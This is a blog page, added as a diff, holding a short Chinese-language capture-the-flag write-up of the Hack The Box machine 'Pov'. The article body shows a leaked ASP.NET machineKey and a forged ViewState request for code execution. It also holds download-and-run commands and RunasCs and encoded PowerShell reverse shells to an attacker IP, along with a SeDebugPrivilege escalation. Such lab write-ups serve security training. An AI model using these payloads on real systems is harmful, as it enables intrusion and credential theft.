@@ -1,0 +1,249 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB-M-Pov | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTB-M-Pov讲的是  根据 web.config 中的文件泄露，构造发送这恶意 viewstate，来执行命令 一个账号密码文件泄露 SeDebugPirvilege的提权（就是有进程迁移进入系统权限  子域名爆破1ffuf -u http:&#x2F;&#x2F;10.10.11.251 -H &#x27;HOST: FUZZ.pov.htb&#x27; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;Sec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-M-Pov">
+<meta property="og:url" content="http://example.com/2025/05/23/HTB-M-Pov/index.html">
+<meta property="og:site_name" content="DDL&#39;S BLOG">
+<meta property="og:description" content="HTB-M-Pov讲的是  根据 web.config 中的文件泄露，构造发送这恶意 viewstate，来执行命令 一个账号密码文件泄露 SeDebugPirvilege的提权（就是有进程迁移进入系统权限  子域名爆破1ffuf -u http:&#x2F;&#x2F;10.10.11.251 -H &#x27;HOST: FUZZ.pov.htb&#x27; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;Sec">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2025-05-23T12:57:57.000Z">
+<meta property="article:modified_time" content="2025-05-23T13:08:37.091Z">
+<meta property="article:author" content="DDL">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2025/05/23/HTB-M-Pov/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB-M-Pov',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB-M-Pov</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTB-M-Pov</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-05-23T12:57:57.000Z" title="Created 2025-05-23 20:57:57">2025-05-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-05-23T13:08:37.091Z" title="Updated 2025-05-23 21:08:37">2025-05-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/penetration/">penetration</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">740</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>3mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="HTB-M-Pov"><a href="#HTB-M-Pov" class="headerlink" title="HTB-M-Pov"></a>HTB-M-Pov</h1><p>讲的是</p>
+<ol>
+<li>根据 web.config 中的文件泄露，构造发送这恶意 viewstate，来执行命令</li>
+<li>一个账号密码文件泄露</li>
+<li>SeDebugPirvilege的提权（就是有进程迁移进入系统权限</li>
+</ol>
+<h3 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://10.10.11.251 -H &#x27;HOST: FUZZ.pov.htb&#x27; -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -ac</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250519084120198.png?raw=true" alt="image-20250519084120198"></p>
+<p>爆破文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gobuster -t 15 --delay 100ms dir -e -u &quot;http://dev.pov.htb/portfolio&quot; -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x aspx</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250519084008580.png?raw=true" alt="image-20250519084008580"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250519084333788.png?raw=true" alt="image-20250519084333788"></p>
+<p>下载简历处存在任意文件读取漏洞</p>
+<p>然后看index.aspx.cs</p>
+<p>下载源码</p>
+<p>web.config里面有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line"></span><br><span class="line">  &lt;system.web&gt;</span><br><span class="line"></span><br><span class="line">    &lt;customErrors mode=&quot;On&quot; defaultRedirect=&quot;default.aspx&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;httpRuntime targetFramework=&quot;4.5&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;machineKey decryption=&quot;AES&quot; decryptionKey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; validation=&quot;SHA1&quot; validationKey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/system.web&gt;</span><br><span class="line"></span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line"></span><br><span class="line">        &lt;httpErrors&gt;</span><br><span class="line"></span><br><span class="line">            &lt;remove statusCode=&quot;403&quot; subStatusCode=&quot;-1&quot; /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;error statusCode=&quot;403&quot; prefixLanguageFilePath=&quot;&quot; path=&quot;http://dev.pov.htb:8080/portfolio&quot; responseMode=&quot;Redirect&quot; /&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/httpErrors&gt;</span><br><span class="line"></span><br><span class="line">        &lt;httpRedirect enabled=&quot;true&quot; destination=&quot;http://dev.pov.htb/portfolio&quot; exactDestination=&quot;false&quot; childOnly=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+
+<p>视图状态是 ASP.NET 框架默认用于在网页之间保留页面和控件值的方法。当页面 HTML 被渲染时，页面的当前状态和需要在回发期间保留的值会被序列化为 Base64 编码的字符串，并输出在视图状态隐藏字段或字段中。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><img src="https://github.com/DDL08/images/blob/img/img/image-20250519090904683.png?raw=true" alt="image-20250519090904683"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /portfolio/contact.aspx HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: dev.pov.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 3489</span><br><span class="line"></span><br><span class="line">Origin: http://dev.pov.htb</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://dev.pov.htb/portfolio/contact.aspx</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__VIEWSTATE=gsTmyv8A8BGigmDoC3iJZYHI6u01Z4s6PcO0XIkF11k7DpbwI%2FzQtApwf%2Bzc6cY%2BqcnzINTE3%2B3zB5%2Fl29ojV06oo6mrbddPlXJkpt%2B5FsdRbwKXHqQGMU%2BHudhP9wgCShBsqQqqpOr6GkYvB2JmDGHMXTwqJh1JGU0%2BX7UCSMfZGDn200ZGevZ64eEryKRRYsU8NxQ2dlafJLeJE2KcVAMqmNpYz4A93ZbLD2a5%2Fz9ghdAxwtufAmokFhXxydrb61%2F9iOrS9piBjJqjWFyfbFijED%2BPX3fpL0WHENb3Qsnsw7N%2BUb5yfwOo7zUOGSAGTo1Zbw7xSIUM72ZZt%2BrWQwjE%2B7BOlSvkjtXQMDEMo2JI4XAiZHm6Ou1Wnc2TnVZueNVZbKfJlO0u9e%2B81SQrMbZrvsTpdnvcOUL0s4fWcZ6pYU9radRX4aDdRchcoCihxHVebrZuc2BYF%2BPo7YVABGBrspoyc5ByzK%2BXxwWAstaXvIroGaMbdjd8qQsZEb%2F%2F2WoUK1FN5zqHORQFlHO1XYVj%2BUE5565kgKNT9C%2BDnzyENkpuVLO5jjW5V%2BDwac3PbXil069wQ46rlssWaPKWhJfx%2Fb7F9lG30Fc6uR2iQvApA5fEKbukpNC4L%2FoKSX2frC4rbpX6hxoa4APRFpos2%2FYQKFhyKc8xgK1wjMANNDS3y0E3e7fX%2FdRJMSoH2guBjDQPs2oKIhopsOrQsQiSYJxtjEt9NSzZy2GhV2L%2FaL57kIa7BZ%2FIFwAyir689zcSx8xuIEAwn60oOjNJUPU6mqI3BzD5QYXQ3EogaHaSgaQmjEHlFmyMdlrBLfsYlYbIrdx8p605rZMK%2BYt7FRUflFJre1GhnaI4YHRbIRdlFz9EwX5y87F9bgAprwJmDka6Zz7AUzWE64jP25p9QzbgE1yLhW%2FNYF9mj58wzUpLtD77m6EUJh5valqMQRs%2By8JFTPSbBhyLoYB94Ij0Hl1HeRdB3jZKAaXAR9%2Fs6LdKguDCuafeXQZgK2IGTRCC8IGCObAGHY1XFsXOr6yW6HpJbOKFk%2BRfOQFnFLhZiRq7NOjM8Kfaaw89d18QHkGYCxINstwy2zGju6ihLQIBe4jWKuj4nNiPD2i4dh0SgLa3xciY8EGJ22%2B6I3RBuhAbRqpV5VdOZE0aHyobgBsLhsPRI3CGBSR%2BH0LFI2six%2Bpt08pcD8yHdETKmKBYzdyUrYcxwXeNjNLV6c1iVHe%2B8qDy4ONQMg0EOwDBUpYCUgmSdEEGhzkjrjEMtZos4HEJNgnPKA75T3CyERltPNsCqnVdICUJxQ2N0z2ZKewXO8%2BcL5uXcxiHhozL82ai651xzzF%2Bop8xW5G%2BY49vbuneW1TEbheSrcefJ7OHyLRFNeNuDv7Wp98IX1sbGYRgLFH8CbOVftkFMHpEiRzL7feMWnyskfohAplrYsW8BXqbPlwO2kbFVwibGylIZFrSHJX2CQd%2BIwD6nTXPGxw77sBiNADbVC41wNaW3w3MS9ECkYUwpDAzCyk9yw8nmf3HqGBAFIGO4evCmwJonSata1zseRmYfIYlf0nxwD45g4QjEIPtAANxjMaYj3kYqKOnrO7lxd7iNtlXsdUGWnR8q0Nyp28wLloGwE9C4gTD%2FPpUAmANkIHdpwQ4S48L5jJ36CGslQmmZqR1b%2B1kCAy4BuCMmo%2FxzVpPecGocoNNk8iauJv%2BMpHnapeReR0pHGB6cdYOvHn5qPrbnXUb6A4B4dtGxmrbYfCdPnA0Es9YGVQzTg6HksPJ75xjjCDgMTXtuH%2BoEpEDy1nkoIY9ogdVctnBotOso8FAk7GTXnvMo9v0cDVyOMualmkyKGHf7yV3XQ%2BwVO2ebDoGpl%2FzQPoibQcDpleYR3jGfzJ32UurbUVnX%2BS6hgjeRsVup%2FxDxqa0Bag%2F%2B5ibkqvUoAV2q92FLnA1Nc6cexzc8wVpC0xZ%2FnFiCwkqJxH1qey5dkzysFDMtFrwryeHu72H5XGMvmxZxtObm5W6ZDSt9jxBt4nIACA7%2FBE%2FT8%2FhghVW5G7b0AP8nlSVP1TxCa%2B%2FDNTjgsSuQJx4fViJfgKj7CfQ9BX%2BwYTxNaKQbgIJ%2BJ0K8j2RVcg6kWnhkfOy%2B0MKlbL5RjG6unugAopZaeB3IBosqScxjJrA2ZeGc64rP1shtLoQM2Ma7KfWGu36fJdLHsGNMu3nVi0KNSSZx1BsH7kzmFLW8eypniJtqxjmvOQAaFT4jaU2iVCHsBnARpi0IOkYpSfGOzafmw6nU3JQCK5MQmlduW0THrCLwvwxAr0HE11GLDUQcq2OPmgmGUHYPCbrfiHO2fVMfbaWFfmcMByS2ciZOu793vwatiHZrNpf8I2ZHklmSXTjOem1KcQyIgHHvcQSUSbtG8ie7yFu%2FXEBbPs%2BmLWD2ojaCy%2BiT0%2B5QYucO3cNsMTvdAIbQCi6A2qU4SowhrPVjfoJmPJzP8h7uAep2BtZqWQeViJWnhBtaqjAIKKByN81nwjuw93iUJ525QHQ4gA7mm4ZM%2FmR1sq%2F9DnUo8tYLV%2B6zfmvPQhwd3YrwGMCGvDMSPVFVTGrTu2RdQm3KYJkbi3k%2FTXsKvrFOLGabbQWdHVbx5n97c7RqN3Uqs1pG308Xv%2FhA3WqbhwT0WyccHSwraFIQB%2FzzTIhmzBswkrEujaZTBRgTbhZBcU0iork92WFz7neMxIANDYYKo8wo9HeRo1mmp0V6hmj7WoyTMIYaj5en4V1toJITWKuE3GOXMQEP3s6aXDk08N2w2O9UIj%2FodeMIBv7Hw0eHxrCp%2FyfLJWIY9K6IxBB0M14oK%2BtDC3U2NK2kPR1ye9NkYBukEN4KPB%2BboLJuhLaBu0Dh1NqPFjBYe%2BfYkbKTJ4u6H1gRxTJh89yrqho5J9M%2BFEsD%2F4%2F2FHgfDieXjmHklHulDuJYndogsDBWhBvQGj1NV5ADDV3Dmc4U9KASNN4A%2BWacr28olyTBouJk5sCLqg4dEiVv23skTWpr%2BC4GX%2FLSzXsTiVQQe1wqR8t0S9x0BhdnRs1mshlxZbzMoJzhVmaKGrK9w1zhanVJ9WGL%2BUxgE1ZDSoPKj8nG9aE%2FA%3D%3D&amp;__VIEWSTATEGENERATOR=37310E71&amp;__EVENTVALIDATION=gbB3R%2BHzbHo0oq7lzLGMWXbsC%2ByQRVlnUdqW6fvswDrRNwhijxbdZKvsIti9RL89IaANlIff4TZcQQrN9JQrSi9f2VXz7xPxExhChaKfkGFF2nJDc1689BrdCTn7nR5dLu7iQQ%3D%3D&amp;message=ttt&amp;submit=Send+Message</span><br></pre></td></tr></table></figure>
+
+<h4 id="传文件"><a href="#传文件" class="headerlink" title="传文件"></a>传文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).downloadString(&#x27;http://10.10.16.14/RunasCs.exe&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil -urlcache -split -f &quot;http://10.10.16.14/psgetsys.ps1&quot; &quot;C:\Users\alaading\Desktop\psgetsys.ps1&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wget &quot;http://10.10.16.14/RunasCs.exe&quot; -outfile &quot;RunasCs.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250519092535650.png?raw=true" alt="image-20250519092535650"></p>
+<p>信息收集有账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\sfitz\Documents&gt; $Credential = Import-Clixml .\connection.xml</span><br><span class="line">PS C:\Users\sfitz\Documents&gt; $Credential.GetNetworkCredential().password</span><br><span class="line">f8gQ8fynP44ek1m3</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RunasCs.exe alaading f8gQ8fynP44ek1m3 &quot;powershell -e J====&quot;</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RunasCs.exe  alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.16.14:444</span><br></pre></td></tr></table></figure>
+
+<p>利用凭证</p>
+<h3 id="提权SeDebugPrivilege"><a href="#提权SeDebugPrivilege" class="headerlink" title="提权SeDebugPrivilege"></a>提权<strong>SeDebugPrivilege</strong></h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>拿powershell脚本跑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1</span><br></pre></td></tr></table></figure>
+
+<p>中间需要一个端口转发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ImpersonateFromParentPid -ppid 552 -command &quot;c:\windows\system32\cmd.exe&quot; -cmdargs &quot;/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA0ACIALAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>拿msf一把梭</p>
+<p>直接上线然后migrate</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://cal1c0.github.io/posts/HTB_Pov_writeup/">https://cal1c0.github.io/posts/HTB_Pov_writeup/</a></li>
+<li><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2024/06/08/htb-pov.html">https://0xdf.gitlab.io/2024/06/08/htb-pov.html</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/23/HTB-M-Pov/">http://example.com/2025/05/23/HTB-M-Pov/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HTB/">HTB</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script 